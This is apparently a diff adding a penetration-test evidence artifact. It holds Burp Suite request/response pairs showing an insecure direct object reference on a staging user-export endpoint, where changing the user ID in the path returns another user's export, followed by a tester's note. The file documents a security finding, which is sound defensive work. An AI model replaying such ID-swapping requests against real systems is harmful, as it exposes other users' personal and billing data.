@@ -1,0 +1,34 @@
+# Evidence Artifact: Burp Suite request/response PoC
+# Finding: Insecure Direct Object Reference in user export endpoint
+# Captured by: Burp Suite Repeater
+
+=== AUTHENTICATED CONTEXT ===
+Authenticated test user: user_id=1001
+Role: standard_user
+
+=== REQUEST A: OWN EXPORT ===
+GET /api/users/1001/export HTTP/1.1
+Host: acme-staging.local
+Authorization: Bearer eyJ.demo-user-1001
+Accept: application/json
+
+=== RESPONSE A ===
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"user_id":1001,"email":"analyst@example.test","export_ready":true,"records":["profile","invoices"]}
+
+=== REQUEST B: MODIFIED OBJECT ID ===
+GET /api/users/1002/export HTTP/1.1
+Host: acme-staging.local
+Authorization: Bearer eyJ.demo-user-1001
+Accept: application/json
+
+=== RESPONSE B ===
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"user_id":1002,"email":"finance@example.test","export_ready":true,"records":["profile","invoices","billing_address"]}
+
+=== TESTER NOTE ===
+Changing the path parameter from 1001 to 1002 returned another user's export data while using the original user's token. Screenshot evidence is attached as 08-idor-response-screenshot.png.
